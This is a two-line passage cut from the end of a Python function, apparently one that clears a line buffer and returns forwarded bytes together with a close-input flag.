            line.clear()
    return bytes(forwarded), close_input
